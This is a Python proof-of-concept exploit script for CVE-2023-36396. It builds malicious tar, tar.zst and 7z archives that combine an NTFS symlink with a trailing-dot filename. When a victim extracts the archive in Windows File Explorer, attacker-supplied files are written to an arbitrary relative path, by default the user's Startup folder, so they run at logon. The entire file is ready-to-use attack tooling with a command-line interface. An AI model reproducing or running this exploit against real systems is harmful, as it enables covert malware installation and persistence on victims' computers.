import argparse
import zstandard
import tarfile
import tempfile
import os
import py7zr

from magic_dot.reparse_points.reparse_points import create_ntfs_symlink

TAR_EXTENSION_TO_OPEN_MODE = {
    ".tar": "w",
    ".tar.gz": "w:gz",
    ".tar.gzip": "w:gz",
    ".tar.xz": "w:xz",
    ".tar.bz2": "w:bz2",
    ".tar.bzip2": "w:bz2",
    ".tar.zst": "w",
    ".tar.zstd": "w",
}


def create_exploit_7zip_archive(files_to_write_paths: list[str], relative_target_directory: str, out_archive_path: str):
    with py7zr.SevenZipFile(out_archive_path, "w") as archive:
        with tempfile.TemporaryDirectory() as temp_dir_path:
            for exe_path in files_to_write_paths:
                exe_name = os.path.basename(exe_path)
                temp_symlink_path = os.path.join(temp_dir_path, f"{exe_name}.link")
                temp_symlink_target_path = os.path.join(relative_target_directory, exe_name)
                create_ntfs_symlink(temp_symlink_path, temp_symlink_target_path, relative=True)
                archive.write(temp_symlink_path, arcname=exe_name)
                archive.write(exe_path, arcname=f"{exe_name}.")

        # For the exploit to work, the files needs to have Linux file attributes which are automatically given
        # if the archive is compressed in Linux but this program runs on Windows
        for file in archive.files:
            if file.filename.endswith("."):
                file.file_properties()["attributes"] = 2181005344 # attributes: A lrwxrwxrwx
            else:
                file.file_properties()["attributes"] = 2717876256 # attributes: A -rwxrwxrwx


def create_exploit_tar_type_archive(files_to_write_paths: list[str], relative_target_directory: str, out_archive_path: str):
    selected_open_mode = ""
    for archive_ext, open_mode in TAR_EXTENSION_TO_OPEN_MODE.items():
        if out_archive_path.endswith(archive_ext):
            selected_open_mode = open_mode

    for exe_path in files_to_write_paths:
        with tarfile.open(out_archive_path, selected_open_mode) as archive:
            with tempfile.TemporaryDirectory() as temp_dir_path:
                exe_name = os.path.basename(exe_path)
                temp_symlink_path = os.path.join(temp_dir_path, f"{exe_name}.link")
                temp_symlink_target_path = os.path.join(relative_target_directory, exe_name)
                create_ntfs_symlink(temp_symlink_path, temp_symlink_target_path, relative=True)
                archive.add(temp_symlink_path, arcname=exe_name)
                archive.add(exe_path, arcname=f"{exe_name}.")

        if out_archive_path.endswith(".tar.zst") or out_archive_path.endswith(".tar.zstd"):
            with open(out_archive_path, "rb+") as f:
                zst_compressor = zstandard.ZstdCompressor()
                compressed_data = zst_compressor.compress(f.read())
                f.write(compressed_data)


def main():
    parser = argparse.ArgumentParser(description="Exploits CVE-2023-36396. Crafts a malicious archive that exploits Windows File Explorer to extract a file to an arbitrary relative path. The default relative path is set to point from the Downloads directory to the user's Startup folder")
    parser.add_argument("files_to_write_paths", nargs='+', default=[], help="File paths separated by spaces. These files are the files which will be written to the chosen victim's directory")
    supported_archive_types = list(TAR_EXTENSION_TO_OPEN_MODE.keys()) + [".7z", ".7zip"]
    supported_archive_types_str = '|'.join(supported_archive_types)
    parser.add_argument("out_archive_path", type=str, help=f"Path to the archive to be created that will contain the exploit. the type of the archive will be determined based on the file extension provided. Supported types: {supported_archive_types_str}")
    parser.add_argument("--target-dir-relative", type=str, help="A relative path from the victim's estimated extraction folder to the destination folder of the executables", default="../../AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")
    args = parser.parse_args()

    if args.out_archive_path.endswith(".7z") or args.out_archive_path.endswith(".7zip"):
        create_exploit_7zip_archive(args.files_to_write_paths, args.target_dir_relative, args.out_archive_path)
    else:
        create_exploit_tar_type_archive(args.files_to_write_paths, args.target_dir_relative, args.out_archive_path)


if __name__ == "__main__":
    main()